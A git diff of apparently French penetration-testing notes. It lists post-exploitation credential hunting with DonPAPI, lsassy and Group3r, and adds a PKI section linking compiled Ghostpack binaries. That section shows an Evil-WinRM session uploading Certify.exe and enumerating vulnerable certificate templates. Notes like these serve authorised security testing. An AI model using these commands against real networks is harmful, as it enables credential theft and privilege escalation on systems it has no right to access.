@@ -53,3 +53,16 @@ Mais vous cherchez également de nouveaux identifiants pour rebondir ou élever 
 -Je peux utiliser l’outil DonPAPI pour découvrir des identifiants enregistrés dans Chrome via DPAPI, qui me permettront peut-être d’avoir un accès sur un équipement d’administration, comme une console vSphere ou un pare-feu.
 - Je peux utiliser l’outil lsassy pour extraire les clés Wi-Fi du processus lsass du poste, afin de découvrir peut-être un Wi-Fi d’administration qui me donnera accès à d’autres réseaux.
 - Je peux utiliser l’outil Group3r qui me permettra peut-être d’extraire des identifiants dans les GPO appliquées sur ce poste, notamment le mot de passe de l’administrateur local.
+
+
+
+
+## Hacking PKI
+- https://github.com/depradip/Ghostpack_CompiledBinaries/tree/main/Ghostpack-CompiledBinaries
+
+```
+*Evil-WinRM* PS C:\Users\Raven\Documents> upload /home/bloman/tools/Windows/Certify.exe
+
+*Evil-WinRM* PS C:\Users\Raven\Documents> .\Certify.exe find /vulnerable
+
+```
